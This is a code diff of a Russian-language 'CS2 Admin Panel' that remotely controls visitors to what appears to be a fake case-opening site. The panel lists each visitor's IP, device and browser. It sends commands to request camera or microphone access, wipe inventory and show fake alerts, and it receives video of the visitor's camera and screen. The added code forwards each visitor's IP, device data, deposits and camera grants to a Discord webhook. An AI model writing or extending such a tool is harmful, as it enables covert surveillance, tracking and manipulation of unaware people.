@@ -20,12 +20,12 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .badge{background:#4ade80;color:#000;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
 .badge.red{background:#eb4b4b;color:#fff}
 .sessions-list{display:flex;flex-direction:column;gap:10px}
-.session{display:grid;grid-template-columns:50px 1fr 160px 140px 120px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
+.session{display:grid;grid-template-columns:60px 1fr 180px 140px 130px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
 .session:hover{border-color:#7c3aed;transform:translateX(4px)}
 .session.active{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);box-shadow:0 0 20px rgba(240,185,11,.3)}
-.session-idx{font-weight:900;font-size:20px;text-align:center;color:#7c3aed}
-.session-ip{font-family:'Courier New',monospace;font-size:14px;font-weight:700;color:#fff}
-.session-ua{font-size:11px;color:#8892a6;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.session-idx{font-weight:900;font-size:20px;text-align:center;color:#7c3aed;font-family:'Courier New',monospace}
+.session-device{font-size:14px;font-weight:700;color:#fff;display:flex;align-items:center;gap:6px}
+.session-ip{font-family:'Courier New',monospace;font-size:11px;color:#8892a6;margin-top:4px}
 .session-time{font-size:12px;color:#8892a6;text-align:right}
 .session-time b{color:#4ade80;display:block;font-size:14px}
 .session-stats{font-size:12px;color:#8892a6;text-align:right}
@@ -90,7 +90,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .url-row{display:flex;gap:8px;margin-bottom:10px}
 .url-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none}
 .url-row input:focus{border-color:#7c3aed}
-.voice-panel{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.voice-panel{display:grid;grid-template-columns:1fr;gap:16px}
 .voice-col{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px}
 .voice-col h4{font-size:13px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
 .voice-btn{padding:14px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:.2s;margin-bottom:8px;width:100%;text-align:left}
@@ -98,9 +98,9 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .voice-btn.active{border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.15),transparent);color:#4ade80}
 .voice-btn.recording{border-color:#eb4b4b;background:linear-gradient(135deg,rgba(235,75,75,.15),transparent);color:#eb4b4b;animation:recPulse 1s infinite}
 @keyframes recPulse{0%,100%{box-shadow:0 0 0 rgba(235,75,75,0)}50%{box-shadow:0 0 20px rgba(235,75,75,.5)}}
-.voice-status{font-size:11px;color:#8892a6;margin-top:8px;text-align:center;line-height:1.4}
-.voice-status.on{color:#4ade80}
-.voice-status.err{color:#eb4b4b}
+.voice-status{font-size:12px;color:#8892a6;margin-top:8px;padding:10px 14px;border-radius:10px;background:#0a0c12;border:1px solid #262c38;text-align:center;line-height:1.5;font-weight:600}
+.voice-status.on{color:#4ade80;border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.1),transparent)}
+.voice-status.err{color:#eb4b4b;border-color:#eb4b4b;background:linear-gradient(135deg,rgba(235,75,75,.1),transparent)}
 .voice-changer{margin-top:12px;padding:14px;background:#0a0c12;border-radius:10px;border:1px solid #262c38}
 .voice-changer .row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:12px}
 .voice-changer .row label{color:#8892a6;min-width:80px}
@@ -110,15 +110,37 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .preset-btn{padding:8px 12px;border-radius:8px;border:1px solid #262c38;background:#181c24;color:#fff;font-size:11px;font-weight:700;cursor:pointer}
 .preset-btn:hover{border-color:#f0b90b}
 .preset-btn.active{background:linear-gradient(135deg,#7c3aed,#ec4899);border-color:transparent}
-@media(max-width:720px){.session{grid-template-columns:40px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}.voice-panel{grid-template-columns:1fr}}
+/* Webhook */
+.webhook-row{display:flex;gap:10px;align-items:center;margin-bottom:14px}
+.webhook-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:13px;outline:none;font-family:monospace}
+.webhook-row input:focus{border-color:#5865f2}
+.webhook-status{font-size:12px;padding:6px 10px;border-radius:8px;font-weight:700;white-space:nowrap}
+.webhook-status.on{background:rgba(74,222,128,.15);color:#4ade80}
+.webhook-status.off{background:rgba(235,75,75,.15);color:#eb4b4b}
+@media(max-width:900px){.session{grid-template-columns:60px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <div class="wrap">
   <div>
     <h1>⚙️ CS2 Admin Panel</h1>
-    <div class="sub">Один peer — все функции. Защита от unavailable-id.</div>
+    <div class="sub">PeerJS + Discord вебхук. Один peer, автоматическое переподключение.</div>
     <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск...</span></div>
+  </div>
+
+  <!-- ВЕБХУК -->
+  <div class="panel">
+    <div class="panel-title"><span>🔔 Discord вебхук</span></div>
+    <div class="webhook-row">
+      <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+      <span class="webhook-status off" id="webhookStatus">не задан</span>
+      <button class="mp3-btn gold" id="webhookSave">Сохранить</button>
+      <button class="mp3-btn" id="webhookTest">Тест</button>
+    </div>
+    <div style="font-size:11px;color:#6b7280">
+      Все события (заход, дроп, апгрейд, камера, голос) будут лететь в этот канал.
+      Как получить: Discord → Настройки канала → Интеграции → Вебхуки → Новый → Скопировать URL.
+    </div>
   </div>
 
   <div class="panel">
@@ -134,11 +156,11 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>🎙 Связь с другом</span></div>
+    <div class="panel-title"><span>🎙 Голосовая связь</span></div>
     <div class="voice-panel">
       <div class="voice-col">
-        <h4>🔊 Я → Друг</h4>
-        <button class="voice-btn" id="talkBtn">🎙 Говорить (микрофон)</button>
+        <h4>🎙 Ты → Друг</h4>
+        <button class="voice-btn" id="talkBtn">🎙 Начать говорить</button>
         <div class="voice-status" id="talkStatus">Не активно</div>
         <div class="voice-changer">
           <div style="font-size:12px;color:#8892a6;margin-bottom:8px;font-weight:700">🎭 Смена голоса</div>
@@ -153,15 +175,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
             <button class="preset-btn" data-preset="echo">Эхо</button>
           </div>
         </div>
-      </div>
-      <div class="voice-col">
-        <h4>🔊 Друг → Я</h4>
-        <button class="voice-btn" id="listenMicBtn">🎤 Слушать микрофон друга</button>
-        <div class="voice-status" id="listenMicStatus">Не активно</div>
-        <button class="voice-btn" id="listenScreenBtn" style="margin-top:12px">🖥 Слушать звук экрана друга</button>
-        <div class="voice-status" id="listenScreenStatus">Не активно</div>
-        <audio id="listenMicAudio" autoplay></audio>
-        <audio id="listenScreenAudio" autoplay></audio>
       </div>
     </div>
   </div>
@@ -198,7 +211,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div></button>
       <button class="prank-btn" data-prank="requestCam"><div class="icon">📸</div><div>Запросить камеру</div></button>
       <button class="prank-btn mic" data-prank="requestMic"><div class="icon">🎤</div><div>Запросить микрофон</div></button>
-      <button class="prank-btn mic" data-prank="requestScreenAudio"><div class="icon">🖥</div><div>Запросить экран+звук</div></button>
       <button class="prank-btn danger" data-prank="clearInventory"><div class="icon">🗑️</div><div>Очистить инвентарь</div></button>
       <button class="prank-btn danger" data-prank="resetStats"><div class="icon">📊</div><div>Сбросить статистику</div></button>
     </div>
@@ -252,16 +264,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <audio id="mp3Audio" style="display:none"></audio>
     </div>
     <div class="playlist" id="playlist"><div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div></div>
-    <div style="margin-top:14px">
-      <div style="font-size:12px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px">🚀 Быстрые</div>
-      <div class="prank-grid">
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/knock-on-door.mp3">🚪 Стук</button>
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/heavy_breathing.mp3">👤 Дыхание</button>
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/fnaf-x-scott.mp3">🐻 FNAF</button>
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/vine-boom.mp3">💥 Boom</button>
-        <button class="prank-btn" data-sound="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3">😱 Wilhelm</button>
-      </div>
-    </div>
   </div>
 
   <div class="panel">
@@ -277,7 +279,7 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
     <div class="panel-title"><span>📹 Видео с устройства друга</span><span class="badge red" id="camCount">0</span></div>
     <div class="video-grid">
       <div class="video-box" id="camBox1"><div class="empty">Камера</div></div>
-      <div class="video-box" id="camBox2"><div class="empty">Экран</div></div>
+      <div class="video-box" id="camBox2"><div class="empty">Экран (только ПК)</div></div>
     </div>
   </div>
 
@@ -289,15 +291,15 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 
 <script>
 /* ============================================================
-   ADMIN PEER — с защитой от unavailable-id
+   ADMIN PEER — защита от unavailable-id
    ============================================================ */
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
-
 let peer = null;
 let conns = new Map();
 let selectedIp = null;
 let camCount = 0;
 const connIp = new WeakMap();
+let friendVoicePeerId = null;
 
 // Голос
 let myMicStream = null;
@@ -309,7 +311,71 @@ let feedbackNode = null;
 let wetGain = null;
 let dryGain = null;
 let destNode = null;
+let voiceCall = null;
 
+/* ============================================================
+   ВЕБХУК DISCORD
+   ============================================================ */
+let webhookUrl = localStorage.getItem('cs2_webhook') || '';
+const webhookInput = document.getElementById('webhookInput');
+const webhookStatus = document.getElementById('webhookStatus');
+if (webhookUrl) {
+    webhookInput.value = webhookUrl;
+    webhookStatus.textContent = 'задан';
+    webhookStatus.className = 'webhook-status on';
+} else {
+    webhookStatus.textContent = 'не задан';
+    webhookStatus.className = 'webhook-status off';
+}
+
+document.getElementById('webhookSave').onclick = () => {
+    const url = webhookInput.value.trim();
+    if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
+        alert('Вставь корректный Discord вебхук URL');
+        return;
+    }
+    webhookUrl = url;
+    localStorage.setItem('cs2_webhook', url);
+    webhookStatus.textContent = 'задан';
+    webhookStatus.className = 'webhook-status on';
+    log('🔔 Вебхук сохранён', 'info');
+    sendWebhook({
+        title: '✅ Вебхук подключён',
+        description: 'Теперь события будут приходить сюда.',
+        color: 0x4ade80,
+        timestamp: new Date().toISOString()
+    });
+};
+
+document.getElementById('webhookTest').onclick = () => {
+    if (!webhookUrl) { alert('Сначала сохрани вебхук'); return; }
+    sendWebhook({
+        title: '🔔 Тестовое сообщение',
+        description: 'Если ты видишь это в Discord — вебхук работает.',
+        color: 0x7c3aed,
+        timestamp: new Date().toISOString()
+    });
+    log('🔔 Тест вебхука отправлен', 'info');
+};
+
+function sendWebhook(embed) {
+    if (!webhookUrl) return;
+    try {
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: 'CS2 Case Bot',
+                avatar_url: 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f3b0.png',
+                embeds: [embed]
+            })
+        }).catch(() => {});
+    } catch(e) {}
+}
+
+/* ============================================================
+   ЛОГ
+   ============================================================ */
 function log(msg, type='info') {
     const l = document.getElementById('log');
     if (!l) return;
@@ -322,7 +388,7 @@ function log(msg, type='info') {
 }
 
 /* ============================================================
-   ПОДКЛЮЧЕНИЕ PEER с защитой
+   PEER — защита от unavailable-id
    ============================================================ */
 function initPeer() {
     const statusEl = document.getElementById('peerStatus');
@@ -331,7 +397,7 @@ function initPeer() {
     try {
         peer = new Peer(ADMIN_PEER_ID);
     } catch(e) {
-        log('❌ Ошибка создания peer: ' + e.message, 'err');
+        log('❌ Ошибка: ' + e.message, 'err');
         setTimeout(initPeer, 3000);
         return;
     }
@@ -341,11 +407,10 @@ function initPeer() {
         log(`✅ PeerJS готов · ID: ${id}`, 'info');
     });
     peer.on('error', (err) => {
-        log(`❌ PeerJS: ${err.type} — ${err.message || ''}`, 'err');
+        log(`❌ PeerJS: ${err.type}`, 'err');
         if (err.type === 'unavailable-id') {
-            statusEl.textContent = '⏳ ID занят. Переподключение через 3 сек...';
+            statusEl.textContent = '⏳ ID занят. Переподключение...';
             dotEl.classList.add('err');
-            dotEl.classList.remove('off');
             try { peer.destroy(); } catch(e){}
             peer = null;
             setTimeout(initPeer, 3000);
@@ -355,8 +420,6 @@ function initPeer() {
             try { peer.destroy(); } catch(e){}
             peer = null;
             setTimeout(initPeer, 5000);
-        } else {
-            dotEl.classList.add('err');
         }
     });
     peer.on('connection', (conn) => {
@@ -364,8 +427,21 @@ function initPeer() {
         conn.on('data', (data) => handleData(data, conn));
         conn.on('close', () => {
             if (connIp.get(conn)) {
-                log('🔴 Отключился: ' + connIp.get(conn), 'warn');
-                conns.delete(connIp.get(conn));
+                const ip = connIp.get(conn);
+                const s = conns.get(ip);
+                if (s) {
+                    sendWebhook({
+                        title: '🔴 Отключился',
+                        color: 0xeb4b4b,
+                        fields: [
+                            {name:'Устройство', value: s.device || 'неизвестно', inline:true},
+                            {name:'IP', value: '`'+ip+'`', inline:true}
+                        ],
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                log('🔴 Отключился: ' + ip, 'warn');
+                conns.delete(ip);
                 renderSessions();
             }
         });
@@ -374,19 +450,8 @@ function initPeer() {
         call.answer();
         log('📹 Входящий видеозвонок', 'info');
         call.on('stream', (stream) => {
-            // Аудио от друга — определяем по tracks
             const hasVideo = stream.getVideoTracks().length > 0;
-            const hasAudio = stream.getAudioTracks().length > 0;
-            if (!hasVideo && hasAudio) {
-                // Это голосовой поток друга — проигрываем в audio
-                const a = document.getElementById('listenMicAudio');
-                a.srcObject = stream;
-                a.play().catch(()=>{});
-                document.getElementById('listenMicStatus').textContent = '🎤 Слушаю микрофон друга';
-                document.getElementById('listenMicStatus').className = 'voice-status on';
-                log('🎤 Принимаю микрофон друга', 'info');
-                return;
-            }
+            if (!hasVideo) return;
             camCount++;
             document.getElementById('camCount').textContent = camCount;
             const box = document.getElementById('camBox' + (camCount === 1 ? '1' : '2'));
@@ -395,12 +460,6 @@ function initPeer() {
             const v = box.querySelector('video');
             v.srcObject = stream;
             v.play().catch(() => { v.muted = true; v.play(); });
-            // Если есть звук — отправляем в отдельный audio
-            if (hasAudio) {
-                const a = document.getElementById('listenScreenAudio');
-                a.srcObject = stream;
-                a.play().catch(()=>{});
-            }
             log(`📹 Видео #${camCount}`, 'warn');
         });
     });
@@ -417,45 +476,159 @@ function screenshot(btn) {
     a.click();
 }
 
+/* ============================================================
+   ОБРАБОТКА ДАННЫХ
+   ============================================================ */
 function handleData(data, conn) {
     if (!data || !data.type) return;
+
     if (data.type === 'hello') {
         connIp.set(conn, data.ip);
-        conns.set(data.ip, { conn, ip: data.ip, ua: data.ua, balance: data.balance, drops: data.drops, joinedAt: data.ts, lastSeen: Date.now() });
-        log('🟢 Подключился: ' + data.ip, 'info');
+        const shortId = data.sessionId || Math.random().toString(36).slice(2,6).toUpperCase();
+        conns.set(data.ip, {
+            conn, ip: data.ip, ua: data.ua,
+            device: data.device || '❓',
+            browser: data.browser || '—',
+            deviceType: data.deviceType || 'desktop',
+            sessionId: shortId,
+            screen: data.screen || '—',
+            balance: data.balance, drops: data.drops,
+            joinedAt: data.ts, lastSeen: Date.now()
+        });
+        log(`🟢 Подключился: ${data.device || ''} · ${data.ip}`, 'info');
         renderSessions();
+        sendWebhook({
+            title: '🟢 Новый заход на сайт',
+            color: 0x7c3aed,
+            fields: [
+                {name:'📱 Устройство', value: data.device || 'неизвестно', inline:true},
+                {name:'🌐 Браузер', value: data.browser || '—', inline:true},
+                {name:'🆔 Сессия', value: '`#'+shortId+'`', inline:true},
+                {name:'🌐 IP', value: '`'+data.ip+'`', inline:false},
+                {name:'🖥 Разрешение', value: data.screen || '—', inline:true},
+                {name:'💰 Баланс', value: '$'+(data.balance||0).toFixed(2), inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
     } else if (data.type === 'heartbeat') {
         const s = conns.get(data.ip);
         if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); }
     } else if (data.type === 'drop') {
-        log(`🎁 Дроп: ${data.skin.name} (${data.skin.price}$)`, 'warn');
+        log(`🎁 Дроп: ${data.skin.name} ($${data.skin.price})`, 'warn');
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '🎁 Дроп из кейса',
+            color: data.profit >= 0 ? 0x4ade80 : 0xeb4b4b,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'🎰 Кейс', value: data.caseName + ' ($' + data.casePrice.toFixed(2) + ')', inline:false},
+                {name:'🔫 Скин', value: data.skin.weapon + ' | ' + data.skin.name, inline:false},
+                {name:'💰 Цена', value: '$' + data.skin.price.toFixed(2), inline:true},
+                {name:'📊 Профит', value: (data.profit>=0?'+':'') + '$' + data.profit.toFixed(2), inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
     } else if (data.type === 'deposit') {
         log(`💳 Пополнение $${data.amount}`, 'info');
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '💳 Пополнение баланса',
+            color: 0x22c55e,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'💰 Сумма', value: '$' + data.amount.toFixed(2), inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
     } else if (data.type === 'upgradeWin') {
         log(`✅ Апгрейд: ${data.your.name} → ${data.target.name}`, 'info');
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '✅ Апгрейд выигран',
+            color: 0x4ade80,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'🎒 Ставка', value: data.your.weapon+' | '+data.your.name+' ($'+data.yourPrice.toFixed(2)+')', inline:false},
+                {name:'🎯 Цель', value: data.target.weapon+' | '+data.target.name+' ($'+data.targetPrice.toFixed(2)+')', inline:false}
+            ],
+            timestamp: new Date().toISOString()
+        });
     } else if (data.type === 'upgradeLose') {
         log(`❌ Апгрейд проигран: ${data.your.name}`, 'err');
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '❌ Апгрейд проигран',
+            color: 0xeb4b4b,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'🎒 Потеряно', value: data.your.weapon+' | '+data.your.name, inline:false}
+            ],
+            timestamp: new Date().toISOString()
+        });
+    } else if (data.type === 'sell') {
+        log(`💸 Продажа: ${data.skin.name} (+$${data.earned.toFixed(2)})`, 'info');
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '💸 Продажа скина',
+            color: 0xf59e0b,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
+                {name:'🔫 Скин', value: data.skin.weapon+' | '+data.skin.name, inline:false},
+                {name:'💰 Получено', value: '$'+data.earned.toFixed(2), inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
     } else if (data.type === 'cameraOn') {
         log('📸 Друг разрешил камеру', 'warn');
-    } else if (data.type === 'micOn') {
-        log('🎤 Друг разрешил микрофон', 'warn');
-        document.getElementById('listenMicStatus').textContent = 'Микрофон подключён';
-        document.getElementById('listenMicStatus').className = 'voice-status on';
-    } else if (data.type === 'micOff') {
-        log('🎤 Друг отключил микрофон', 'warn');
-        document.getElementById('listenMicStatus').textContent = 'Микрофон отключён';
-        document.getElementById('listenMicStatus').className = 'voice-status';
-    } else if (data.type === 'screenOn') {
-        log(`🖥 Друг расшарил экран${data.hasAudio ? ' со звуком' : ' (без звука)'}`, 'warn');
-        document.getElementById('listenScreenStatus').textContent = 'Экран подключён' + (data.hasAudio ? ' (со звуком)' : '');
-        document.getElementById('listenScreenStatus').className = 'voice-status on';
-    } else if (data.type === 'screenOff') {
-        log('🖥 Друг выключил экран', 'warn');
-        document.getElementById('listenScreenStatus').textContent = 'Экран отключён';
-        document.getElementById('listenScreenStatus').className = 'voice-status';
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '📸 Друг разрешил камеру',
+            color: 0xec4899,
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
+    } else if (data.type === 'voicePlaying') {
+        log('🟢 Друг слушает тебя', 'info');
+        document.getElementById('talkStatus').textContent = '🟢 Друг слушает';
+        document.getElementById('talkStatus').className = 'voice-status on';
+        const s = conns.get(connIp.get(conn) || '?');
+        sendWebhook({
+            title: '🎙 Друг слушает тебя',
+            color: 0x4ade80,
+            description: 'Подтверждение от устройства — воспроизведение идёт',
+            fields: [
+                {name:'📱 Устройство', value: s?.device || '?', inline:true},
+                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true}
+            ],
+            timestamp: new Date().toISOString()
+        });
+    } else if (data.type === 'voiceStopped') {
+        log('🔇 Друг перестал слушать', 'warn');
+        document.getElementById('talkStatus').textContent = '🔇 Не слушает';
+        document.getElementById('talkStatus').className = 'voice-status';
+    } else if (data.type === 'voicePeerId') {
+        friendVoicePeerId = data.peerId;
+        log('🎙 Друг готов слушать. Voice Peer ID: ' + data.peerId, 'warn');
+        // Если микрофон уже включён — звоним сейчас
+        if (modifiedStream && peer && peer.open) {
+            makeVoiceCall();
+        }
+    } else if (data.type === 'voiceFail') {
+        log('❌ Голос у друга не работает: ' + data.error, 'err');
     }
 }
 
+/* ============================================================
+   РЕНДЕР СЕССИЙ
+   ============================================================ */
 function renderSessions() {
     const list = document.getElementById('sessionsList');
     document.getElementById('sessionCount').textContent = conns.size;
@@ -472,8 +645,11 @@ function renderSessions() {
         const d = document.createElement('div');
         d.className = 'session' + (selectedIp === s.ip ? ' active' : '');
         d.innerHTML = `
-            <div class="session-idx">#${i+1}</div>
-            <div><div class="session-ip">${s.ip}</div><div class="session-ua">${(s.ua||'').slice(0,80)}</div></div>
+            <div class="session-idx">#${s.sessionId||i+1}</div>
+            <div>
+                <div class="session-device">${s.device || '❓'} <span style="color:#8892a6;font-size:11px">${s.browser || ''}</span></div>
+                <div class="session-ip">${s.ip}</div>
+            </div>
             <div class="session-time"><b>${agoT}</b>зашёл</div>
             <div class="session-stats"><b>${s.drops}</b>дропов · $${(s.balance||0).toFixed(0)}</div>
             <div class="session-status"><div class="status-dot ${online?'':'off'}"></div>${online?'онлайн':'офлайн'}</div>
@@ -490,6 +666,8 @@ function selectSession(ip) {
     if (s) {
         info.className = 'selected-info';
         info.innerHTML = `
+            <div><div class="label">Устройство</div><div class="value" style="font-size:14px">${s.device||'?'}</div></div>
+            <div><div class="label">Браузер</div><div class="value" style="font-size:14px">${s.browser||'?'}</div></div>
             <div><div class="label">IP</div><div class="value">${s.ip}</div></div>
             <div><div class="label">Баланс</div><div class="value">$${(s.balance||0).toFixed(2)}</div></div>
             <div><div class="label">Дропов</div><div class="value">${s.drops}</div></div>
@@ -508,7 +686,6 @@ function sendPrank(action, extra = {}) {
 }
 
 document.querySelectorAll('.prank-btn[data-prank]').forEach(b => b.addEventListener('click', () => sendPrank(b.dataset.prank)));
-document.querySelectorAll('.prank-btn[data-sound]').forEach(b => b.addEventListener('click', () => sendPrank('playSound', {url: b.dataset.sound})));
 
 document.getElementById('alertBtn').onclick = () => sendPrank('alert', {text: document.getElementById('alertText').value});
 document.getElementById('modalBtn').onclick = () => sendPrank('showModal', {title: document.getElementById('modalTitle').value, text: document.getElementById('modalText').value});
@@ -519,25 +696,16 @@ document.getElementById('setBalanceBtn').onclick = () => sendPrank('setBalance',
 document.getElementById('addBalanceBtn').onclick = () => sendPrank('addBalance', {value: Number(document.getElementById('balanceAmount').value)});
 
 /* ============================================================
-   СМЕНА ГОЛОСА
+   ГОЛОС — ТЫ ГОВОРИШЬ, ДРУГ СЛЫШИТ
    ============================================================ */
 const pitchSlider = document.getElementById('pitchSlider');
 const echoSlider = document.getElementById('echoSlider');
 const pitchVal = document.getElementById('pitchVal');
 const echoVal = document.getElementById('echoVal');
-
 let voiceParams = { pitch: 1.0, echo: 0 };
 
-pitchSlider.oninput = () => {
-    voiceParams.pitch = pitchSlider.value / 100;
-    pitchVal.textContent = voiceParams.pitch.toFixed(2);
-    applyVoiceParams();
-};
-echoSlider.oninput = () => {
-    voiceParams.echo = echoSlider.value / 100;
-    echoVal.textContent = echoSlider.value + '%';
-    applyVoiceParams();
-};
+pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); applyVoiceParams(); };
+echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; applyVoiceParams(); };
 
 document.querySelectorAll('.preset-btn').forEach(b => {
     b.onclick = () => {
@@ -552,7 +720,6 @@ document.querySelectorAll('.preset-btn').forEach(b => {
         else if (p === 'echo') setVoice(100, 70);
     };
 });
-
 function setVoice(pi, ec) {
     pitchSlider.value = pi; echoSlider.value = ec;
     pitchVal.textContent = (pi/100).toFixed(2);
@@ -561,31 +728,37 @@ function setVoice(pi, ec) {
     voiceParams.echo = ec/100;
     applyVoiceParams();
 }
-
 function applyVoiceParams() {
     if (!sourceNode || !audioCtx) return;
-    if (sourceNode.playbackRate) {
-        try { sourceNode.playbackRate.value = voiceParams.pitch; } catch(e){}
-    }
     if (wetGain) wetGain.gain.value = voiceParams.echo;
 }
 
-/* ============================================================
-   КНОПКА "ГОВОРИТЬ"
-   ============================================================ */
+function makeVoiceCall() {
+    if (!modifiedStream || !peer || !peer.open) return;
+    if (!friendVoicePeerId) { log('⚠️ Друг ещё не готов слушать', 'warn'); return; }
+    try {
+        if (voiceCall) { try { voiceCall.close(); } catch(e){} }
+        voiceCall = peer.call(friendVoicePeerId, modifiedStream);
+        voiceCall.on('stream', () => {});
+        voiceCall.on('close', () => { log('📞 Голосовой звонок завершён', 'warn'); });
+        log('🎙 Звоню другу на voice peer', 'info');
+    } catch(e) { log('❌ Ошибка звонка: ' + e.message, 'err'); }
+}
+
 document.getElementById('talkBtn').addEventListener('click', async () => {
     const btn = document.getElementById('talkBtn');
     const status = document.getElementById('talkStatus');
 
     if (myMicStream) {
-        // Выключаем микрофон
+        // Выключаем
         myMicStream.getTracks().forEach(t => t.stop());
         myMicStream = null;
         if (audioCtx) { try { audioCtx.close(); } catch(e){} audioCtx = null; }
         sourceNode = null; destNode = null; wetGain = null; dryGain = null;
         modifiedStream = null;
+        if (voiceCall) { try { voiceCall.close(); } catch(e){} voiceCall = null; }
         btn.classList.remove('active', 'recording');
-        btn.innerHTML = '🎙 Говорить (микрофон)';
+        btn.innerHTML = '🎙 Начать говорить';
         status.textContent = 'Не активно';
         status.className = 'voice-status';
         log('🎙 Микрофон выключен', 'warn');
@@ -599,12 +772,7 @@ document.getElementById('talkBtn').addEventListener('click', async () => {
     try {
         myMicStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-
-        // Создаём цепочку: source → dry → dest
-        //                          ↘ delay → wet → dest
         sourceNode = audioCtx.createMediaStreamSource(myMicStream);
-
-        // Эхо
         delayNode = audioCtx.createDelay(1.0);
         delayNode.delayTime.value = 0.15;
         feedbackNode = audioCtx.createGain();
@@ -613,64 +781,28 @@ document.getElementById('talkBtn').addEventListener('click', async () => {
         wetGain.gain.value = voiceParams.echo;
         dryGain = audioCtx.createGain();
         dryGain.gain.value = 1;
-
         destNode = audioCtx.createMediaStreamDestination();
-
-        // Подключение
         sourceNode.connect(dryGain);
         dryGain.connect(destNode);
-
         sourceNode.connect(delayNode);
         delayNode.connect(feedbackNode);
         feedbackNode.connect(delayNode);
         delayNode.connect(wetGain);
         wetGain.connect(destNode);
-
         modifiedStream = destNode.stream;
 
-        // Звоним другу — он принимает и играет
-        const call = peer.call('CS2_ADMIN_X7K9QW2_voice_slot', modifiedStream);
-        // Не важно какой ID — друг принимает любой входящий звонок
